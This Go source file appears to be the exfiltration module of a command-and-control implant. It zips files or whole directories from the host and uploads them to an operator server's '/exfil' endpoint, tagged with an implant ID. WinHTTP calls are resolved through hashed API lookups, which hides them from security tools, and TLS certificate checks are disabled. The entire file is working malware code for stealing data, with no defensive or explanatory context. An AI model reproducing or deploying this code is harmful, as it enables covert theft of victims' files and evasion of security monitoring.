package exfil

import (
	"archive/zip"
	"bytes"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"unsafe"

	wc "github.com/carved4/go-wincall"
)

func ZipPath(path string) ([]byte, error) {
	fi, err := os.Stat(path)
	if err != nil {
		return nil, fmt.Errorf("stat failed: %w", err)
	}

	var buf bytes.Buffer
	zw := zip.NewWriter(&buf)

	if fi.IsDir() {
		basePath := filepath.Clean(path)
		err = filepath.Walk(basePath, func(filePath string, info os.FileInfo, err error) error {
			if err != nil {
				return err
			}

			relPath, err := filepath.Rel(basePath, filePath)
			if err != nil {
				return err
			}

			relPath = filepath.ToSlash(relPath)
			if relPath == "." {
				return nil
			}

			header, err := zip.FileInfoHeader(info)
			if err != nil {
				return err
			}
			header.Name = relPath

			if info.IsDir() {
				header.Name += "/"
				_, err = zw.CreateHeader(header)
				return err
			}

			header.Method = zip.Deflate

			writer, err := zw.CreateHeader(header)
			if err != nil {
				return err
			}

			file, err := os.Open(filePath)
			if err != nil {
				return err
			}
			defer file.Close()

			_, err = io.Copy(writer, file)
			return err
		})
	} else {
		header, err := zip.FileInfoHeader(fi)
		if err != nil {
			return nil, fmt.Errorf("create header failed: %w", err)
		}
		header.Method = zip.Deflate

		writer, err := zw.CreateHeader(header)
		if err != nil {
			return nil, fmt.Errorf("create file in zip failed: %w", err)
		}

		file, err := os.Open(path)
		if err != nil {
			return nil, fmt.Errorf("open file failed: %w", err)
		}
		defer file.Close()

		_, err = io.Copy(writer, file)
		if err != nil {
			return nil, fmt.Errorf("copy to zip failed: %w", err)
		}
	}

	if err != nil {
		return nil, fmt.Errorf("walk failed: %w", err)
	}

	if err := zw.Close(); err != nil {
		return nil, fmt.Errorf("close zip failed: %w", err)
	}

	return buf.Bytes(), nil
}

func PostExfil(serverURL string, zipData []byte, filename string, userAgent string, implantID string) error {
	url := serverURL
	if len(url) > 0 && url[len(url)-1] == '/' {
		url = url[:len(url)-1]
	}
	url = url + "/exfil"

	return httpPost(url, zipData, filename, userAgent, implantID)
}

func httpPost(url string, body []byte, filename string, userAgent string, implantID string) error {
	if len(url) < 8 {
		return fmt.Errorf("invalid URL")
	}

	var host, path string
	var port uint16 = 443
	var secure bool = true

	if len(url) >= 8 && url[:8] == "https://" {
		remaining := url[8:]
		parseHostPathPort(remaining, &host, &path, &port)
	} else if len(url) >= 7 && url[:7] == "http://" {
		remaining := url[7:]
		port = 80
		parseHostPathPort(remaining, &host, &path, &port)
		secure = false
	} else {
		return fmt.Errorf("invalid URL scheme")
	}

	wc.LoadLibraryLdr("winhttp.dll")
	dllHash := wc.GetHash("winhttp.dll")
	moduleBase := wc.GetModuleBase(dllHash)

	winHttpOpen := wc.GetFunctionAddress(moduleBase, wc.GetHash("WinHttpOpen"))
	winHttpConnect := wc.GetFunctionAddress(moduleBase, wc.GetHash("WinHttpConnect"))
	winHttpOpenRequest := wc.GetFunctionAddress(moduleBase, wc.GetHash("WinHttpOpenRequest"))
	winHttpSendRequest := wc.GetFunctionAddress(moduleBase, wc.GetHash("WinHttpSendRequest"))
	winHttpReceiveResponse := wc.GetFunctionAddress(moduleBase, wc.GetHash("WinHttpReceiveResponse"))
	winHttpCloseHandle := wc.GetFunctionAddress(moduleBase, wc.GetHash("WinHttpCloseHandle"))
	winHttpAddRequestHeaders := wc.GetFunctionAddress(moduleBase, wc.GetHash("WinHttpAddRequestHeaders"))
	winHttpSetOption := wc.GetFunctionAddress(moduleBase, wc.GetHash("WinHttpSetOption"))

	userAgentPtr, _ := wc.UTF16ptr(userAgent)
	hostPtr, _ := wc.UTF16ptr(host)
	pathPtr, _ := wc.UTF16ptr(path)
	methodPtr, _ := wc.UTF16ptr("POST")

	hSession, _, _ := wc.CallG0(winHttpOpen, uintptr(unsafe.Pointer(userAgentPtr)), 0, 0, 0, 0)
	if hSession == 0 {
		return fmt.Errorf("WinHttpOpen failed")
	}
	defer wc.CallG0(winHttpCloseHandle, hSession)

	hConnect, _, _ := wc.CallG0(winHttpConnect, hSession, uintptr(unsafe.Pointer(hostPtr)), uintptr(port), 0)
	if hConnect == 0 {
		return fmt.Errorf("WinHttpConnect failed")
	}
	defer wc.CallG0(winHttpCloseHandle, hConnect)

	var flags uintptr = 0
	if secure {
		flags = 0x00800000
	}

	hRequest, _, _ := wc.CallG0(winHttpOpenRequest, hConnect, uintptr(unsafe.Pointer(methodPtr)), uintptr(unsafe.Pointer(pathPtr)), 0, 0, 0, flags)
	if hRequest == 0 {
		return fmt.Errorf("WinHttpOpenRequest failed")
	}
	defer wc.CallG0(winHttpCloseHandle, hRequest)

	if secure {
		var secFlags uint32 = 0x00003300
		wc.CallG0(winHttpSetOption, hRequest, uintptr(31), uintptr(unsafe.Pointer(&secFlags)), uintptr(4))
	}

	contentType, _ := wc.UTF16ptr("Content-Type: application/zip\r\n")
	wc.CallG0(winHttpAddRequestHeaders, hRequest, uintptr(unsafe.Pointer(contentType)), ^uintptr(0), 0x20000000)

	filenameHeader, _ := wc.UTF16ptr(fmt.Sprintf("X-Filename: %s\r\n", filename))
	wc.CallG0(winHttpAddRequestHeaders, hRequest, uintptr(unsafe.Pointer(filenameHeader)), ^uintptr(0), 0x20000000)

	implantHeader, _ := wc.UTF16ptr(fmt.Sprintf("X-Implant-ID: %s\r\n", implantID))
	wc.CallG0(winHttpAddRequestHeaders, hRequest, uintptr(unsafe.Pointer(implantHeader)), ^uintptr(0), 0x20000000)

	var bodyPtr uintptr
	var bodyLen uintptr
	if len(body) > 0 {
		bodyPtr = uintptr(unsafe.Pointer(&body[0]))
		bodyLen = uintptr(len(body))
	}

	result, _, _ := wc.CallG0(winHttpSendRequest, hRequest, 0, 0, bodyPtr, bodyLen, bodyLen, 0)
	if result == 0 {
		return fmt.Errorf("WinHttpSendRequest failed")
	}

	result, _, _ = wc.CallG0(winHttpReceiveResponse, hRequest, 0)
	if result == 0 {
		return fmt.Errorf("WinHttpReceiveResponse failed")
	}

	return nil
}

func parseHostPathPort(remaining string, host, path *string, port *uint16) {
	slashPos := -1
	colonPos := -1
	for i, c := range remaining {
		if c == ':' && colonPos == -1 {
			colonPos = i
		}
		if c == '/' {
			slashPos = i
			break
		}
	}

	hostEnd := len(remaining)
	if slashPos != -1 {
		hostEnd = slashPos
		*path = remaining[slashPos:]
	} else {
		*path = "/"
	}

	hostPart := remaining[:hostEnd]

	if colonPos != -1 && colonPos < hostEnd {
		*host = hostPart[:colonPos]
		portStr := hostPart[colonPos+1:]
		var p int
		for _, c := range portStr {
			if c >= '0' && c <= '9' {
				p = p*10 + int(c-'0')
			}
		}
		if p > 0 && p < 65536 {
			*port = uint16(p)
		}
	} else {
		*host = hostPart
	}
}
